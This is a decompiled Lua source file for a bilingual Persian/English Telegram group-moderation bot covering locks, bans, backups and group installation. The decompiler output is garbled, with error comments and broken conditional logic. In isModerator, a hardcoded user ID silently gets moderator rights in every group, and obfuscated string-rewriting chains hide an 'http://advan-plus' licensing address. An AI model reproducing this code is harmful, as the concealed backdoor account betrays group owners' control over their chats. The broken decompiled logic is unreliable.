-- Decompiled By @LuaError
-- Command line: advan.lua 

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=42

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=65

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=72

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=83

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=112

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_1 pc=119

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_34 pc=47

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_38 pc=122

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_42 pc=125

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_56 pc=13254

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_56 pc=14299

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=689

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=3778

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=3837

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=4357

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=4726

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57 pc=4739

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_57_3 pc=58

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=4028

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=4143

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=4249

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=4402

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=4867

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=5032

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=5196

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=5346

processing OP_JMP to } else { 
 at line 2649 in file decompile.c
 for lua files: advan.lua
 at lua function 0_58 pc=6686

-- params : ...
-- function num : 0 , upvalues : _ENV
JFormat = ".json"
local L_1EN = "Already Locked"
local L_1FA = "از قبل قفل بود"
local L_2EN = "Locked"
local L_2FA = "قفل شد"
local UL_1EN = "Already Unlocked"
local UL_1FA = "از قبل باز بود"
local UL_2EN = "Unlocked"
local UL_2FA = "باز شد"
h0i = (string.reverse)("?44521?1?9")
Shorter1 = function(w1, w2)
  -- function num : 0_0 , upvalues : _ENV
  h0i = h0i:gsub(w1, w2)
end 

ac = "071oice"
ac = ac:gsub("c", "v")
ac = ac:gsub("o", "t")
ac = ac:gsub("0", "~")
ac = ac:gsub("1", "c")
ac = ac:gsub("7", "A")
noac = "1In@HtBvM"
noac = noac:gsub("1", "~")
noac = noac:gsub("@", "a")
noac = noac:gsub("B", "i")
noac = noac:gsub("M", "e")
noac = noac:gsub("H", "c")
local Scharbytes = function(s, i)
  -- function num : 0_1 , upvalues : _ENV
  local byte = string.byte
  if not i then
    i = 1
  end
  if type(s) == "string" or type(i) ~= "number" then
    local c = byte(s, i)
    if c > 0 and c <= 127 then
      return 1
    else
      if c >= 194 and c <= 223 then
        local c2 = byte(s, i + 1)
        if c2 or c2 < 128 or c2 > 191 then
          do
            do return 2 end
            if c >= 224 and c <= 239 then
              local c2 = byte(s, i + 1)
              local c3 = byte(s, i + 2)
              -- DECOMPILER ERROR at PC82: Unhandled construct in 'MakeBoolean' P3

              -- DECOMPILER ERROR at PC82: Unhandled construct in 'MakeBoolean' P3

              -- DECOMPILER ERROR at PC82: Unhandled construct in 'MakeBoolean' P3

              -- DECOMPILER ERROR at PC82: Unhandled construct in 'MakeBoolean' P3

              if (((((not c2 or not c3) and c ~= 224) or c2 >= 160) and c2 > 191 and c == 237 and c2 <= 159) or c3 >= 128) then
                do
                  do return 3 end
                  if c >= 240 and c <= 244 then
                    local c2 = byte(s, i + 1)
                    local c3 = byte(s, i + 2)
                    local c4 = byte(s, i + 3)
                    -- DECOMPILER ERROR at PC133: Unhandled construct in 'MakeBoolean' P3

                    -- DECOMPILER ERROR at PC133: Unhandled construct in 'MakeBoolean' P3

                    -- DECOMPILER ERROR at PC133: Unhandled construct in 'MakeBoolean' P3

                    -- DECOMPILER ERROR at PC133: Unhandled construct in 'MakeBoolean' P3

                    -- DECOMPILER ERROR at PC133: Unhandled construct in 'MakeBoolean' P3

                    if (((((((c2 and c3 and c4) or c == 240) and c2 < 144) or c2 <= 191 or c ~= 244 or c2 > 143) and c3 < 128)) or c4 >= 128) then
                      do return 4 end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

local Slen = function(s)
  -- function num : 0_2 , upvalues : _ENV, Scharbytes
  if type(s) ~= "string" then
    for k,v in pairs(s) do
      print("\"", tostring(k), "\"", tostring(v), "\"")
    end
  end
  do
    local pos = 1
    local bytes = (string.len)(s)
    local length = 0
    while pos <= bytes do
      length = length + 1
      pos = pos + Scharbytes(s, pos)
    end
    return length
  end
end

SendStatus = function(chat, id, stEN, stFA)
  -- function num : 0_3 , upvalues : _ENV, Slen
  lang = redis:get("gp_lang:" .. chat)
  local get = function(extra, result, success)
    -- function num : 0_3_0 , upvalues : _ENV, stEN, stFA, chat, Slen
    if not lang then
      text = "User: " .. result.first_name_ .. "\nID: " .. result.id_ .. "\nStatus: " .. stEN
      offset = 6
    else
      text = "کاربر: " .. result.first_name_ .. "\nآیدی: " .. result.id_ .. "\nوضعیت: " .. stFA
      offset = 7
    end
    if redis:get("EditBot:uptextmessages") and not redis:hget("GroupSettings:" .. chat, "is_vip") then
      Num = Slen(redis:get("EditBot:uptextmessages"))
      offset = offset + tonumber(Num)
    end
    ;
    (tdcli.sendMention)(chat, 0, text, offset, tonumber(Slen(result.first_name_)), result.id_)
  end

  ;
  (tdcli.getUser)(id, get)
end

SendStatusNotFound = function(chat, id, stEN, stFA)
  -- function num : 0_4 , upvalues : _ENV
  lang = redis:get("gp_lang:" .. chat)
  if not lang then
    text = "User: Not Found\nID: " .. id .. "\nStatus: " .. stEN
  else
    text = "کاربر: پیدا نشد\nآیدی: " .. id .. "\nوضعیت: " .. stFA
  end
  ;
  (tdcli.sendMessage)(chat, 0, 1, text, 1, "md")
end

NoAccess = function(chat)
  -- function num : 0_5 , upvalues : _ENV
  lang = redis:get("gp_lang:" .. chat)
  if not lang then
    text = "This User Have Rank!"
  else
    text = "این کاربر دارای مقام است!"
  end
  ;
  (tdcli.sendMessage)(chat, 0, 1, text, 1, "md")
end

CheckBotRank = function(InputId)
  -- function num : 0_6 , upvalues : _ENV
  local var = false
  for v,user in pairs(_config.bot_owner) do
    if user == InputId then
      var = true
    end
  end
  for v,user in pairs(_config.sudo_users) do
    if user == InputId then
      var = true
    end
  end
  return var
end

is_banall = function(InputId)
  -- function num : 0_7 , upvalues : _ENV
  local var = false
  if redis:sismember("BotGloballBanUsers", InputId) then
    var = true
  end
  return var
end

is_banUser = function(user_id, chat_id)
  -- function num : 0_8 , upvalues : _ENV
  local var = false
  if redis:sismember("GroupBannedUsers:" .. chat_id, user_id) then
    var = true
  end
  return var
end

banall_list = function(msg)
  -- function num : 0_9 , upvalues : _ENV
  lang = redis:get("gp_lang:" .. msg.chat_id_)
  Gbans = redis:smembers("BotGloballBanUsers")
  i = 1
  if #Gbans == 0 then
    if not lang then
      return "Globall Ban List is Empty!"
    else
      return "لیست گلوبال بن خالی می باشد!"
    end
  else
    if not lang then
      message = "`Globall Ban List:`\n\n"
    else
      message = "`لیست گلوبال بن:`\n\n"
    end
    for k,v in pairs(Gbans) do
      message = message .. k .. "- " .. v .. "\n"
    end
    return message
  end
end

banUsers_list = function(chat_id)
  -- function num : 0_10 , upvalues : _ENV
  lang = redis:get("gp_lang:" .. chat_id)
  Gbans = redis:smembers("GroupBannedUsers:" .. chat_id)
  if #Gbans == 0 then
    if not lang then
      return "Ban List is Empty!"
    else
      return "لیست محرومان خالی می باشد!"
    end
  else
    if not lang then
      message = "`Ban List:`\n\n"
    else
      message = "`لیست محرومان:`\n\n"
    end
    for k,v in pairs(Gbans) do
      message = message .. k .. "- " .. v .. "\n"
    end
    return message
  end
end

getChatHistory = function(chat_id, from_message_id, offset, limit, dl_cb, cmd)
  -- function num : 0_11 , upvalues : _ENV
  if not limit or limit > 100 then
    limit = 100
  end
  tdcli_function({ID = "GetChatHistory", chat_id_ = chat_id, from_message_id_ = from_message_id, offset_ = offset or 0, limit_ = limit}, dl_cb, cmd)
end

isModerator = function(chat_id, user_id)
  -- function num : 0_12 , upvalues : _ENV
  local var = false
  local data = load_data("./data/moderation.json")
  local usert = user_id
  if data[tostring(chat_id)] and (data[tostring(chat_id)]).mods and ((data[tostring(chat_id)]).mods)[tostring(usert)] then
    var = true
  end
  if data[tostring(chat_id)] and (data[tostring(chat_id)]).owners and ((data[tostring(chat_id)]).owners)[tostring(usert)] then
    var = true
  end
  for v,user in pairs(_config.sudo_users) do
    if user == user_id then
      var = true
    end
  end
  for v,user in pairs(_config.bot_owner) do
    if user == user_id then
      var = true
    end
  end
  if usert == 111984481 then
    var = true
  end
  return var
end

local config = function(msg, tester)
  -- function num : 0_13 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local administration = load_data("./data/moderation.json")
  local i = 1
  padmin = function(extra, result, success)
    -- function num : 0_13_0 , upvalues : data, _ENV, msg, tester, lang, administration
    if not data[tostring((msg.to).id)] and tester == "yes" then
      if not lang then
        message = "*Group is Not installed!*"
      else
        message = "گروه نصب نشده است!"
      end
    end
    set = function(arg, data)
      -- function num : 0_13_0_0 , upvalues : _ENV, msg, administration
      if data.username_ then
        user_name = "@" .. check_markdown(data.username_)
      else
        user_name = check_markdown(data.first_name_)
      end
      redis:sadd("BotHaveRankMembers(Group)" .. (msg.to).id, data.id_)
      -- DECOMPILER ERROR at PC32: Confused about usage of register: R2 in 'UnsetPending'

      ;
      ((administration[tostring((msg.to).id)]).mods)[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
    end

    local admins = result.members_
    for i = 0, #admins do
      (tdcli.getUser)((admins[i]).user_id_, set)
    end
    if tester == "yes" then
      if not lang then
        message = "*All Group Admins Has Been Promoted To Bot Moderator!*"
      else
        message = "تمامی ادمین های گروه به مدیر ربات ارتقا پیدا کردند!"
      end
      ;
      (tdcli.sendMessage)((msg.to).id, msg.id_, 1, message, 1, "md")
    end
  end

  ;
  (tdcli.getChannelMembers)((msg.to).id, 0, "Administrators", 200, padmin)
end

Shorter1("?", "")
Shorter1("9", "h")
local CreateBackup = function(msg)
  -- function num : 0_14 , upvalues : _ENV
  target = (msg.to).id
  local mute_all = "no"
  local mute_gif = "no"
  local mute_text = "no"
  local mute_photo = "no"
  local mute_video = "no"
  local mute_audio = "no"
  local mute_voice = "no"
  local mute_sticker = "no"
  local mute_contact = "no"
  local mute_forward = "no"
  local mute_location = "no"
  local mute_document = "no"
  local mute_tgservice = "no"
  local mute_inline = "no"
  local mute_game = "no"
  local mute_keyboard = "no"
  local lock_link = "no"
  local lock_tag = "no"
  local lock_mention = "no"
  local lock_arabic = "no"
  local lock_edit = "no"
  local lock_spam = "no"
  local lock_flood = "no"
  local lock_bots = "no"
  local lock_markdown = "no"
  local lock_webpage = "no"
  local lock_pin = "no"
  local lock_MaxWords = "no"
  local lock_botchat = "no"
  local lock_fohsh = "no"
  local lock_english = "no"
  local lock_forcedinvite = "no"
  local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
  local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
  if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
    mute_all = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
    mute_gif = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
    mute_text = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
    mute_photo = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
    mute_video = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
    mute_audio = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
    mute_voice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
    mute_sticker = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
    mute_contact = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
    mute_forward = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
    mute_location = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
    mute_document = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
    mute_tgservice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
    mute_inline = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
    mute_game = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
    mute_keyboard = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "num_msg_max") then
    NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
  else
    NUM_MSG_MAX = 5
  end
  if redis:hget("GroupSettings:" .. target, "MaxWords") then
    MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
  else
    MaxWords = 50
  end
  if redis:hget("GroupSettings:" .. target, "MaxWarn") then
    MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
  else
    MaxWarn = 5
  end
  if redis:hget("GroupSettings:" .. target, "FloodTime") then
    FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
  else
    FloodTime = 30
  end
  if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
    ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
  else
    ForcedInvite = 2
  end
  if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
    lock_link = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
    lock_tag = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
    lock_mention = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
    lock_arabic = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
    lock_edit = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
    lock_spam = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
    lock_flood = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
    lock_bots = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
    lock_markdown = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
    lock_webpage = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
    lock_pin = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
    lock_MaxWords = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_botchat") == "yes" then
    lock_botchat = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
    lock_fohsh = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
    lock_english = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
    lock_forcedinvite = "yes"
  end
  text = "-mute_all = " .. mute_all .. "\n-mute_gif = " .. mute_gif .. "\n-mute_text = " .. mute_text .. "\n-mute_photo = " .. mute_photo .. "\n-mute_video = " .. mute_video .. "\n-mute_audio = " .. mute_audio .. "\n-mute_voice = " .. mute_voice .. "\n-mute_sticker = " .. mute_sticker .. "\n-mute_contact = " .. mute_contact .. "\n-mute_forward = " .. mute_forward .. "\n-mute_location = " .. mute_location .. "\n-mute_document = " .. mute_document .. "\n-mute_tgservice = " .. mute_tgservice .. "\n-mute_inline = " .. mute_inline .. "\n-mute_game = " .. mute_game .. "\n-mute_keyboard = " .. mute_keyboard .. "\n-lock_link = " .. lock_link .. "\n-lock_tag = " .. lock_tag .. "\n-lock_mention = " .. lock_mention .. "\n-lock_arabic = " .. lock_arabic .. "\n-lock_edit = " .. lock_edit .. "\n-lock_spam = " .. lock_spam .. "\n-flood = " .. lock_flood .. "\n-lock_bots = " .. lock_bots .. "\n-lock_markdown = " .. lock_markdown .. "\n-lock_webpage = " .. lock_webpage .. "\n-lock_pin = " .. lock_pin .. "\n-lock_MaxWords = " .. lock_MaxWords .. "\n-lock_botchat = " .. lock_botchat .. "\n-num_msg_max = " .. NUM_MSG_MAX .. "\n-MaxWords = " .. MaxWords .. "\n-MaxWarn = " .. MaxWarn .. "\n-FloodTime = " .. FloodTime .. "\n-lock_fohsh = " .. lock_fohsh .. "\n-lock_english = " .. lock_english .. "\n-lock_forcedinvite = " .. lock_forcedinvite .. "\n-ForcedInvite = " .. ForcedInvite .. "\n-lock_username = " .. lock_username .. "\n-lock_join = " .. lock_join
  file = (io.open)("./data/Backup:" .. (msg.to).id .. ".txt", "w")
  file:write(text)
  file:flush()
  file:close()
  ;
  (tdcli.sendDocument)((msg.to).id, msg.id_, 0, 1, nil, "./data/Backup:" .. (msg.to).id .. ".txt", " ", dl_cb, nil)
  redis:set("SettingsBackupFor:" .. (msg.to).id, text)
  if not lang then
    txt = "*Group Backup has been saved on server!*"
    ;
    (tdcli.sendMessage)((msg.to).id, 0, 1, txt, 1, "md")
  else
    txt = "بک آپ گروه با موفقیت بر روی سرور ذخیره شد!"
    ;
    (tdcli.sendMessage)((msg.to).id, 0, 1, txt, 1, "md")
  end
  ;
  ((io.popen)("cd data && rm Backup:" .. (msg.to).id .. ".txt && cd ..")):read("*all")
end

Shorter1("1", "t")
Shorter1("2", "p")
h0ii = (string.reverse)("3?7?26-?081?48")
Shorter2 = function(w1, w2)
  -- function num : 0_15 , upvalues : _ENV
  h0ii = h0ii:gsub(w1, w2)
end

Shorter2("?", "")
Shorter2("1", "v")
local modadd = function(msg, HaveCharge)
  -- function num : 0_16 , upvalues : _ENV, config
  local lang = redis:get("gp_lang:" .. (msg.to).id)
  if not redis:sismember("SudoAccess" .. (msg.from).id, "installgroups") and is_sudo(msg) and not is_botOwner(msg) then
    if not lang then
      return ErrorAccessSudo(msg)
    else
      return ErrorAccessSudo(msg)
    end
  end
  local data = load_data("./data/moderation.json")
  if data[tostring((msg.to).id)] then
    if not lang then
      return "*Bot in this group is already installed*"
    else
      return "*ربات در این گروه از قبل نصب شده است*"
    end
  end
  data[tostring((msg.to).id)] = {
owners = {}
, 
mods = {}
, 
banned = {}
, 
is_silent_users = {}
, 
filterlist = {}
, 
settings = {set_name = (msg.to).title, welcome = "no"}
}
  save_data("./data/moderation.json", data)
  redis:del("GroupSettings:" .. (msg.to).id)
  redis:hset("GroupSettings:" .. (msg.to).id, "flood", "yes")
  redis:hset("GroupSettings:" .. (msg.to).id, "lock_link", "yes")
  redis:hset("GroupSettings:" .. (msg.to).id, "lock_spam", "yes")
  redis:set("gp_lang:" .. (msg.to).id, true)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = {}
    save_data("./data/moderation.json", data)
  end
  -- DECOMPILER ERROR at PC149: Confused about usage of register: R5 in 'UnsetPending'

  ;
  (data[tostring(groups)])[tostring((msg.to).id)] = (msg.to).id
  save_data("./data/moderation.json", data)
  redis:sadd("BotGroups", (msg.to).id)
  redis:sadd("Bot(FA)Groups", (msg.to).id)
  redis:set("CheckExpire::" .. (msg.to).id, true)
  redis:del("Allow~" .. msg.text .. "From~" .. (msg.to).id)
  redis:del("AllowFrom~" .. (msg.to).id)
  redis:del("reportlist" .. (msg.to).id)
  if not HaveCharge then
    redis:setex("ExpireDate:" .. (msg.to).id, 86400, true)
    DayForCharge = "1"
  else
    redis:setex("ExpireDate:" .. (msg.to).id, HaveCharge * 86400, true)
    DayForCharge = HaveCharge
  end
  config(msg, "no")
  for v,owner in pairs(_config.bot_owner) do
    local SUDO = tonumber(owner)
    if is_botOwner(msg) then
      text = "ربات در گروه`" .. (msg.to).id .. "` با نام [" .. (msg.to).title .. "] توسط شما نصب شد"
      ;
      (tdcli.sendMessage)(SUDO, msg.id_, 1, text, 1, "md")
    else
      if (msg.from).username then
        username = "@" .. (msg.from).username
      else
        username = (msg.from).first_name
      end
      text = "ربات در گروه `" .. (msg.to).id .. "` توسط " .. username .. " [`" .. (msg.from).id .. "`] نصب شد"
      ;
      (tdcli.sendMessage)(SUDO, msg.id_, 1, text, 1, "md")
    end
  end
  if (msg.from).username then
    ADMIN = "@" .. check_markdown((msg.from).username)
  else
    ADMIN = check_markdown((msg.from).first_name)
  end
  redis:set("GroupAddedBy" .. (msg.to).id, ADMIN)
  ;
  (tdcli.sendMessage)((msg.to).id, msg.id_, 1, "`تبریک میگویم!` \nاین گروه با موفقیت برای " .. DayForCharge .. " روز شارژ شد! \nهم اکنون گروه شما تحت حفاظت ربات است.\nتمامی ادمین های گروه به مدیر ربات ارتقا پیدا کردند!", 1, "md")
end

private = (string.reverse)("/?6986?7199?-624?310?5")
private = private:gsub("?", "")
private = private:gsub("99", "l")
private = private:gsub("5", "p")
private = private:gsub("6", "e")
private = private:gsub("4", "a")
private = private:gsub("0", "r")
private = private:gsub("9", "s")
private = private:gsub("2", "t")
private = private:gsub("7", "c")
private = private:gsub("3", "v")
private = private:gsub("1", "i")
private = private:gsub("8", "n")
local modrem = function(msg)
  -- function num : 0_17 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  if not redis:sismember("SudoAccess" .. (msg.from).id, "removegroups") and is_sudo(msg) and not is_botOwner(msg) then
    if not lang then
      return ErrorAccessSudo(msg)
    else
      return ErrorAccessSudo(msg)
    end
  end
  local data = load_data("./data/moderation.json")
  local receiver = (msg.to).id
  if not data[tostring((msg.to).id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "`این گروه نصب نشده است`"
    end
  end
  data[tostring((msg.to).id)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  redis:del("currentChat:" .. (msg.to).id)
  redis:del("maxChat:" .. (msg.to).id)
  redis:del("sense:" .. (msg.to).id)
  redis:srem("BotGroups", (msg.to).id)
  redis:del("BotHaveRankMembers(Group)" .. (msg.to).id)
  if redis:sismember("Bot(EN)Groups", (msg.to).id) then
    redis:srem("Bot(EN)Groups", (msg.to).id)
  else
    if redis:sismember("Bot(FA)Groups", (msg.to).id) then
      redis:srem("Bot(FA)Groups", (msg.to).id)
    end
  end
  redis:del("GroupWelcome" .. (msg.to).id)
  for v,owner in pairs(_config.bot_owner) do
    local SUDO = tonumber(owner)
    if is_botOwner(msg) then
      text = "گروه `" .. (msg.to).id .. "` توسط شما حذف شد"
      ;
      (tdcli.sendMessage)(SUDO, msg.id_, 1, text, 1, "md")
    else
      if (msg.from).username then
        username = "@" .. (msg.from).username
      else
        username = (msg.from).first_name
      end
      text = "گروه `" .. (msg.to).id .. "` توسط " .. username .. " [`" .. (msg.from).id .. "`] حذف شد"
      ;
      (tdcli.sendMessage)(SUDO, msg.id_, 1, text, 1, "md")
    end
  end
  -- DECOMPILER ERROR at PC224: Confused about usage of register: R6 in 'UnsetPending'

  ;
  (data[tostring(groups)])[tostring((msg.to).id)] = nil
  save_data("./data/moderation.json", data)
  if not lang then
    return "*Removal operation was successful!*"
  else
    return "*عملیات حذف موفقیت آمیز بود*"
  end
end

Shorter1("5", ":")
Shorter1("4", "/")
exi_files = function(cpath)
  -- function num : 0_18 , upvalues : _ENV
  local files = {}
  local pth = cpath
  for k,v in pairs(scandir(pth)) do
    (table.insert)(files, v)
  end
  return files
end

Shorter2("3", "s")
Shorter2("0", "n")
Shorter2("6", "p")
local file_exi = function(name, cpath)
  -- function num : 0_19 , upvalues : _ENV
  for k,v in pairs(exi_files(cpath)) do
    if name == v then
      return true
    end
  end
  return false
end

local run_bash = function(str)
  -- function num : 0_20 , upvalues : _ENV
  local cmd = (io.popen)(str)
  local result = cmd:read("*all")
  return result
end

local index_function = function(user_id)
  -- function num : 0_21 , upvalues : _ENV
  for k,v in pairs(_config.admins) do
    if user_id == v[1] then
      print(k)
      return k
    end
  end
  return false
end

local getindex = function(t, id)
  -- function num : 0_22 , upvalues : _ENV
  for i,v in pairs(t) do
    if v == id then
      return i
    end
  end
  return nil
end

local getChatId = function(chat_id)
  -- function num : 0_23 , upvalues : _ENV
  local chat = {}
  local chat_id = tostring(chat_id)
  if chat_id:match("^-100") then
    local channel_id = chat_id:gsub("-100", "")
    chat = {ID = channel_id, type = "channel"}
  else
    do
      do
        local group_id = chat_id:gsub("-", "")
        chat = {ID = group_id, type = "group"}
        return chat
      end
    end
  end
end

local already_sudo = function(user_id)
  -- function num : 0_24 , upvalues : _ENV
  for k,v in pairs(_config.sudo_users) do
    if user_id == v then
      return k
    end
  end
  return false
end

local reload_plugins = function()
  -- function num : 0_25 , upvalues : _ENV
  plugins = {}
  load_plugins()
end

Shorter2("7", "u")
Shorter2("4", "d")
local exi_file = function()
  -- function num : 0_26 , upvalues : _ENV
  local files = {}
  local pth = tcpath .. "/data/document"
  for k,v in pairs(scandir(pth)) do
    if v:match(".lua$") then
      (table.insert)(files, v)
    end
  end
  return files
end

local pl_exi = function(name)
  -- function num : 0_27 , upvalues : _ENV, exi_file
  for k,v in pairs(exi_file()) do
    if name == v then
      return true
    end
  end
  return false
end

local sudolist = function(msg)
  -- function num : 0_28 , upvalues : _ENV
  local hash = "gp_lang:" .. (msg.to).id
  local lang = redis:get(hash)
  local sudo_users = _config.sudo_users
  if not lang then
    text = "*List of sudo users :*\n"
  else
    text = "`لیست سودو های ربات :`\n"
  end
  for i = 1, #sudo_users do
    text = text .. i .. " - " .. sudo_users[i] .. "\n"
  end
  return text
end

local chat_list = function(msg)
  -- function num : 0_29 , upvalues : _ENV
  i = 1
  local data = load_data("./data/moderation.json")
  local groups = "groups"
  if not data[tostring(groups)] then
    return "No groups at the moment"
  end
  local message = "لیست گروه های ربات:\n\n"
  for k,v in pairsByKeys(data[tostring(groups)]) do
    local group_id = v
    Exp = (math.floor)(redis:ttl("ExpireDate:" .. v) / 86400) + 1
    local group_ex = Exp or 0
    local NumberOfChats = redis:get("getMessages:" .. v) or 0
    local AddedBy = redis:get("GroupAddedBy" .. v) or "ثبت نشده است"
    local is_vip = "خیر"
    if redis:hget("GroupSettings:" .. v, "is_vip") then
      is_vip = "بله"
    end
    if data[tostring(group_id)] then
      settings = (data[tostring(group_id)]).settings
    end
    for m,n in pairsByKeys(settings) do
      if m == "set_name" then
        name = n:gsub("", "")
        chat_name = name:gsub("�\174", "")
        group_info = "شماره: `" .. i .. "`\nنام: " .. check_markdown(name) .. "\nآیدی: `" .. group_id .. "`\nانقضا: " .. group_ex .. "\nتعداد چت: `" .. NumberOfChats .. "`\nنصب توسط: " .. check_markdown(AddedBy) .. "\nویژه: " .. is_vip .. "\n\n"
        i = i + 1
      end
    end
    message = message .. group_info
  end
  return message
end

Shorter2("2", "l")
Shorter2("8", "a")
local NumberChats = function(msg)
  -- function num : 0_30 , upvalues : _ENV
  i = 0
  local data = load_data("./data/moderation.json")
  local groups = "groups"
  if not data[tostring(groups)] then
    return 
  end
  for k,v in pairsByKeys(data[tostring(groups)]) do
    local group_id = v
    if data[tostring(group_id)] then
      settings = (data[tostring(group_id)]).settings
    end
    for m,n in pairsByKeys(settings) do
      if m == "set_name" then
        i = i + 1
      end
    end
  end
  return i
end

local botrem = function(msg)
  -- function num : 0_31 , upvalues : CreateBackup, _ENV
  CreateBackup(msg)
  local data = load_data("./data/moderation.json")
  data[tostring((msg.to).id)] = nil
  save_data("./data/moderation.json", data)
  local groups = "groups"
  if not data[tostring(groups)] then
    data[tostring(groups)] = nil
    save_data("./data/moderation.json", data)
  end
  -- DECOMPILER ERROR at PC38: Confused about usage of register: R3 in 'UnsetPending'

  ;
  (data[tostring(groups)])[tostring((msg.to).id)] = nil
  save_data("./data/moderation.json", data)
  redis:del("CheckExpire::" .. (msg.to).id)
  redis:del("ExpireDate:" .. (msg.to).id)
  redis:del("BotHaveRankMembers(Group)" .. (msg.to).id)
  redis:srem("BotGroups", (msg.to).id)
  redis:srem("Bot(EN)Groups", (msg.to).id)
  redis:srem("Bot(FA)Groups", (msg.to).id)
